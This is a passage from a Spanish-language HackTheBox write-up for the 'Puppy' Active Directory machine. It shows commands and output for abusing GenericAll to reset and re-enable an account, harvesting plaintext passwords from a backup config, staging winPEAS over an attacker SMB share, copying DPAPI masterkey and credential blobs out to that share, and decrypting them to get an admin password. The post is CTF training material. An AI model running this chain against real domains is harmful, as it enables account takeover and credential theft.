<p>Tenemos varios vectores de explotaci√≥n hac√≠a ese usuario. Vamos a cambiar la contrase√±a aprovechandonos de ese derecho:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">net</span> <span class="n">rpc</span> <span class="n">password</span> <span class="s2">&#34;adam.silver&#34;</span> <span class="s2">&#34;p@ssword123&#34;</span> <span class="o">-</span><span class="n">U</span> <span class="s2">&#34;puppy.htb&#34;</span><span class="o">/</span><span class="s2">&#34;ant.edwards&#34;</span><span class="s">%&#39;Antman2025!&#39;</span> <span class="o">-</span><span class="n">S</span> <span class="s2">&#34;10.10.11.70&#34;</span></span></span></code></pre></div>
<p>Probamos a ver si funcion√≥ el cambio de contrase√±a:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;adam.silver&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;p@ssword123&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[-]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">adam</span><span class="o">.</span><span class="n">silver</span><span class="ss">:p</span><span class="vi">@ssword123</span> <span class="no">STATUS_ACCOUNT_DISABLED</span></span></span></code></pre></div>
<h4 id="credentialstxt-2">
  Credentials.txt
  <a class="heading-link" href="#credentialstxt-2">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">levi.james / KingofAkron2025
</span></span><span class="line"><span class="cl">ant.edwards / Antman2025!
</span></span><span class="line"><span class="cl">adam.silver / p@ssword123</span></span></code></pre></div>
<p>La cuenta est√° deshabilitada&hellip; Y s√≠ efectivamente:</p>
<p><img src="/images/posts/puppy/image-5.png" alt="alt text"></p>
<p>Como tenemos el permiso <code>GenericAll</code> y en la descripci√≥n de <strong>Bloodhound</strong>, menciona que podemos modificar <strong>las propiedades de ese usuario</strong>, capaz y podemos activar la cuenta, a trav√©s de <code>ldapsearch</code> y con <code>ldapmodify</code>.</p>
<p>Para activar la cuenta necesitamos ver primero el valor de <strong>userAccountControl</strong>, de alg√∫n usuario que est√© activo(su cuenta):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ldapsearch</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">H</span> <span class="ss">ldap</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">D</span> <span class="s2">&#34;ant.edwards@puppy.htb&#34;</span> <span class="o">-</span><span class="n">W</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&#34;dc=puppy,dc=htb&#34;</span> <span class="s2">&#34;(sAMAccountName=ant.edwards)&#34;</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">userAccountControl</span>
</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">LDAP</span> <span class="ss">Password</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="ss">userAccountControl</span><span class="p">:</span> <span class="mi">66048</span></span></span></code></pre></div>
<p>Similar a la misma sint√°xis ahora con <code>ldapmodify</code> modificar la propiedad userAccountControl de adam.silver a ese valor:</p>
<p><img src="/images/posts/puppy/image-7.png" alt="alt text"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ldapmodify</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">H</span> <span class="ss">ldap</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">D</span> <span class="s2">&#34;ant.edwards@puppy.htb&#34;</span> <span class="o">-</span><span class="n">W</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span>                                                                       
</span></span><span class="line"><span class="cl"><span class="n">heredoc</span><span class="o">&gt;</span> <span class="ss">dn</span><span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Adam</span> <span class="n">D</span><span class="o">.</span> <span class="no">Silver</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Users</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="no">PUPPY</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="no">HTB</span>                                        
</span></span><span class="line"><span class="cl"><span class="n">heredoc</span><span class="o">&gt;</span> <span class="ss">changetype</span><span class="p">:</span> <span class="n">modify</span>  
</span></span><span class="line"><span class="cl"><span class="n">heredoc</span><span class="o">&gt;</span> <span class="ss">replace</span><span class="p">:</span> <span class="n">userAccountControl</span>                                                    
</span></span><span class="line"><span class="cl"><span class="n">heredoc</span><span class="o">&gt;</span> <span class="ss">userAccountControl</span><span class="p">:</span> <span class="mi">66048</span>
</span></span><span class="line"><span class="cl"><span class="n">heredoc</span><span class="o">&gt;</span> <span class="no">EOF</span>
</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">LDAP</span> <span class="ss">Password</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="n">modifying</span> <span class="n">entry</span> <span class="s2">&#34;CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB&#34;</span></span></span></code></pre></div>
<p>Le volvemos a asignar la contrase√±a.</p>
<p>Verificamos si se activ√≥ la cuenta:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;adam.silver&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;p@ssword123&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[+]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">adam</span><span class="o">.</span><span class="n">silver</span><span class="ss">:p</span><span class="vi">@ssword123</span></span></span></code></pre></div>
<p>Nos fijamos que este usuario est√° en el grupo de remote management, por tanto podemos solicitar una shell:</p>
<p><img src="/images/posts/puppy/image-6.png" alt="alt text"></p>
<p><img src="/images/posts/puppy/image-8.png" alt="alt text"></p>
<p>Enumeramos&hellip;</p>
<p><img src="/images/posts/puppy/image-9.png" alt="alt text"></p>
<p>Lo descargamos, vemos que es un respaldo del servidor, y tiene un .xml.bak:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">nms</span><span class="o">-</span><span class="n">auth</span><span class="o">-</span><span class="n">config</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">bak</span> 
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="p">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="sc">?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">ldap</span><span class="o">-</span><span class="n">config</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">server</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span><span class="no">DC</span><span class="o">.</span><span class="n">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="o">&lt;</span><span class="sr">/host&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">        &lt;port&gt;389&lt;/</span><span class="n">port</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">base</span><span class="o">-</span><span class="n">dn</span><span class="o">&gt;</span><span class="n">dc</span><span class="o">=</span><span class="no">PUPPY</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="no">HTB</span><span class="o">&lt;</span><span class="sr">/base-dn&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">        &lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/</span><span class="n">bind</span><span class="o">-</span><span class="n">dn</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">bind</span><span class="o">-</span><span class="n">password</span><span class="o">&gt;</span><span class="no">ChefSteph2025</span><span class="o">!&lt;</span><span class="sr">/bind-password&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">    &lt;/se</span><span class="n">rver</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">user</span><span class="o">-</span><span class="n">attributes</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">attribute</span> <span class="nb">name</span><span class="o">=</span><span class="s2">&#34;username&#34;</span> <span class="n">ldap</span><span class="o">-</span><span class="n">attribute</span><span class="o">=</span><span class="s2">&#34;uid&#34;</span> <span class="sr">/&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">        &lt;attribute name=&#34;firstName&#34; ldap-attribute=&#34;givenName&#34; /</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">attribute</span> <span class="nb">name</span><span class="o">=</span><span class="s2">&#34;lastName&#34;</span> <span class="n">ldap</span><span class="o">-</span><span class="n">attribute</span><span class="o">=</span><span class="s2">&#34;sn&#34;</span> <span class="sr">/&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">        &lt;attribute name=&#34;email&#34; ldap-attribute=&#34;mail&#34; /</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="sr">/user-attributes&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">    &lt;group-attributes&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">        &lt;attribute name=&#34;groupName&#34; ldap-attribute=&#34;cn&#34; /</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">attribute</span> <span class="nb">name</span><span class="o">=</span><span class="s2">&#34;groupMember&#34;</span> <span class="n">ldap</span><span class="o">-</span><span class="n">attribute</span><span class="o">=</span><span class="s2">&#34;member&#34;</span> <span class="sr">/&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">    &lt;/</span><span class="n">group</span><span class="o">-</span><span class="n">attributes</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">search</span><span class="o">-</span><span class="n">filter</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">filter</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">objectClass</span><span class="o">=</span><span class="n">person</span><span class="p">)(</span><span class="n">uid</span><span class="o">=</span><span class="sx">%s))</span><span class="o">&lt;</span><span class="sr">/filter&gt;
</span></span></span><span class="line"><span class="cl"><span class="sr">    &lt;/se</span><span class="n">arch</span><span class="o">-</span><span class="n">filter</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="sr">/ldap-config&gt;</span></span></span></code></pre></div>
<p>Probamos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">netexec</span> <span class="n">smb</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;steph.cooper&#39;</span> <span class="o">-</span><span class="nb">p</span> <span class="s1">&#39;ChefSteph2025!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[*]</span> <span class="no">Windows</span> <span class="no">Server</span> <span class="mi">2022</span> <span class="no">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="nb">name</span><span class="ss">:DC</span><span class="p">)</span> <span class="p">(</span><span class="ss">domain</span><span class="p">:</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">)</span> <span class="p">(</span><span class="ss">signing</span><span class="p">:</span><span class="no">True</span><span class="p">)</span> <span class="p">(</span><span class="ss">SMBv1</span><span class="p">:</span><span class="no">False</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">SMB</span>         <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">70</span>     <span class="mi">445</span>    <span class="no">DC</span>               <span class="o">[+]</span> <span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="ss">:ChefSteph2025!</span></span></span></code></pre></div>
<h4 id="credentialstxt-3">
  Credentials.txt
  <a class="heading-link" href="#credentialstxt-3">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">levi.james / KingofAkron2025
</span></span><span class="line"><span class="cl">ant.edwards / Antman2025!
</span></span><span class="line"><span class="cl">adam.silver / p@ssword123
</span></span><span class="line"><span class="cl">steph.cooper / ChefSteph2025!</span></span></code></pre></div>
<p><img src="/images/posts/puppy/image-10.png" alt="alt text"></p>
<p>Podemos tambi√©n con steph.cooper entablar una shell:</p>
<p><img src="/images/posts/puppy/image-11.png" alt="alt text"></p>
<p>En los usuarios nos fijamos que existe un steph.cooper_adm, curioso. Usemos <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20251004-ba856a2a/winPEASx64.exe"  class="external-link" target="_blank" rel="noopener">WinPEAS.exe</a> para enumeraci√≥n automatizada a este sistema, enviemos el .exe con <strong>impacket-smbserver</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># Compartimos el winpeas.exe</span>
</span></span><span class="line"><span class="cl"><span class="n">impacket</span><span class="o">-</span><span class="n">smbserver</span> <span class="n">smbFolder</span> <span class="err">$</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">-</span><span class="n">username</span> <span class="n">daveey</span> <span class="o">-</span><span class="n">password</span> <span class="n">daveey123</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Creamos una unidad de recurso compartido:</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="ss">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span> <span class="n">net</span> <span class="n">use</span> <span class="ss">f</span><span class="p">:</span> <span class="p">\\</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">15</span><span class="o">.</span><span class="mi">48</span><span class="p">\</span><span class="n">smbFolder</span> <span class="sr">/u:daveey daveey123
</span></span></span><span class="line"><span class="cl"><span class="sr">The command completed successfully.
</span></span></span><span class="line"><span class="cl"><span class="sr">
</span></span></span><span class="line"><span class="cl"><span class="sr"># Copiamos el winpeas.exe y ejecutamos
</span></span></span><span class="line"><span class="cl"><span class="sr">*Evil-WinRM* PS C:\Users\steph.cooper\Desktop&gt; copy z:\winpeas.exe winpeas.exe</span></span></span></code></pre></div>
<p><img src="/images/posts/puppy/image-12.png" alt="alt text"></p>
<p>Aqu√≠ nos encontr√≥ una masterkey y 2 blobs de credenciales, jugando con estos 3 binarios podemos obtener las credenciales de esos 2 blobs. Nos lo traemos a nuestra m√°quina para jugar con <code>impacket-dpapi</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="ss">f</span><span class="p">:\</span><span class="o">&gt;</span> <span class="n">copy</span> <span class="ss">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="p">\</span><span class="no">AppData</span><span class="p">\</span><span class="no">Roaming</span><span class="p">\</span><span class="no">Microsoft</span><span class="p">\</span><span class="no">Protect</span><span class="p">\</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1487982659</span><span class="o">-</span><span class="mi">1829050783</span><span class="o">-</span><span class="mi">2281216199</span><span class="o">-</span><span class="mi">1107</span><span class="p">\</span><span class="mi">556</span><span class="n">a2412</span><span class="o">-</span><span class="mi">1275</span><span class="o">-</span><span class="mi">4</span><span class="n">ccf</span><span class="o">-</span><span class="n">b721</span><span class="o">-</span><span class="n">e6a0b4f90407</span> <span class="ss">f</span><span class="p">:\</span><span class="n">masterkey</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="ss">f</span><span class="p">:\</span><span class="o">&gt;</span> <span class="n">copy</span> <span class="ss">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">steph</span><span class="o">.</span><span class="n">cooper</span><span class="p">\</span><span class="no">AppData</span><span class="p">\</span><span class="no">Roaming</span><span class="p">\</span><span class="no">Microsoft</span><span class="p">\</span><span class="no">Credentials</span><span class="p">\</span><span class="no">C8D69EBE9A43E9DEBF6B5FBD48B521B9</span> <span class="ss">f</span><span class="p">:\</span><span class="n">credentials_blob</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="ss">f</span><span class="p">:\</span><span class="o">&gt;</span></span></span></code></pre></div>
<p>Usamos <code>impacket-dpapi</code> con la password de steph.cooper:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">dpapi</span> <span class="n">masterkey</span> <span class="o">-</span><span class="n">file</span> <span class="n">masterkey</span> <span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1487982659</span><span class="o">-</span><span class="mi">1829050783</span><span class="o">-</span><span class="mi">2281216199</span><span class="o">-</span><span class="mi">1107</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="no">MASTERKEYFILE</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="no">Version</span>     <span class="p">:</span>        <span class="mi">2</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Guid</span>        <span class="p">:</span> <span class="mi">556</span><span class="n">a2412</span><span class="o">-</span><span class="mi">1275</span><span class="o">-</span><span class="mi">4</span><span class="n">ccf</span><span class="o">-</span><span class="n">b721</span><span class="o">-</span><span class="n">e6a0b4f90407</span>
</span></span><span class="line"><span class="cl"><span class="no">Flags</span>       <span class="p">:</span>        <span class="mi">0</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Policy</span>      <span class="p">:</span> <span class="mi">4</span><span class="n">ccf1275</span> <span class="p">(</span><span class="mi">1288639093</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">MasterKeyLen</span><span class="p">:</span> <span class="mo">000000</span><span class="mi">88</span> <span class="p">(</span><span class="mi">136</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">BackupKeyLen</span><span class="p">:</span> <span class="mo">0000006</span><span class="mi">8</span> <span class="p">(</span><span class="mi">104</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">CredHistLen</span> <span class="p">:</span> <span class="mo">00000000</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">DomainKeyLen</span><span class="p">:</span> <span class="mo">00000174</span> <span class="p">(</span><span class="mi">372</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="ss">Password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="no">Decrypted</span> <span class="n">key</span> <span class="n">with</span> <span class="no">User</span> <span class="no">Key</span> <span class="p">(</span><span class="no">MD4</span> <span class="kp">protected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Decrypted</span> <span class="ss">key</span><span class="p">:</span> <span class="mh">0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span></span></span></code></pre></div>
<p>Ya obtenido la key, procedemos a descifrar el blob de credentials:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">impacket</span><span class="o">-</span><span class="n">dpapi</span> <span class="n">credential</span> <span class="o">-</span><span class="n">file</span> <span class="n">credentials_blob</span> <span class="o">-</span><span class="n">key</span> <span class="mh">0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="no">CREDENTIAL</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="no">LastWritten</span> <span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mo">03</span><span class="o">-</span><span class="mi">08</span> <span class="mi">15</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">29</span><span class="o">+</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="no">Flags</span>       <span class="p">:</span> <span class="mh">0x00000030</span> <span class="p">(</span><span class="no">CRED_FLAGS_REQUIRE_CONFIRMATION</span><span class="o">|</span><span class="no">CRED_FLAGS_WILDCARD_MATCH</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Persist</span>     <span class="p">:</span> <span class="mh">0x00000003</span> <span class="p">(</span><span class="no">CRED_PERSIST_ENTERPRISE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Type</span>        <span class="p">:</span> <span class="mh">0x00000002</span> <span class="p">(</span><span class="no">CRED_TYPE_DOMAIN_PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="no">Target</span>      <span class="p">:</span> <span class="ss">Domain</span><span class="p">:</span><span class="n">target</span><span class="o">=</span><span class="no">PUPPY</span><span class="o">.</span><span class="n">HTB</span>
</span></span><span class="line"><span class="cl"><span class="no">Description</span> <span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="no">Unknown</span>     <span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="no">Username</span>    <span class="p">:</span> <span class="n">steph</span><span class="o">.</span><span class="n">cooper_adm</span>
</span></span><span class="line"><span class="cl"><span class="no">Unknown</span>     <span class="p">:</span> <span class="no">FivethChipOnItsWay2025</span><span class="o">!</span></span></span></code></pre></div>
<p><img src="/images/posts/puppy/image-13.png" alt="alt text"></p>
<p>Pwned!</p>
<hr>


      </div>


      <footer>
        

<section class="see-also">
  
    
    
    
      <h3 id="tambi√©n-ver-en-hackthebox">
        Tambi√©n ver en HackTheBox
        <a class="heading-link" href="#tambi%c3%a9n-ver-en-hackthebox">
          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
          <span class="sr-only">Link to heading</span>
        </a>
      </h3>
      <nav>
        <ul>
        
        
          
            <li>
              <a href="/posts/cap/">Cap CTF</a>
            </li>
          
        
          
        
        </ul>
      </nav>
    
  
</section>


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ¬©
    
      2019 -
    
    2025
     David Le√≥n 
    ¬∑
    
    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
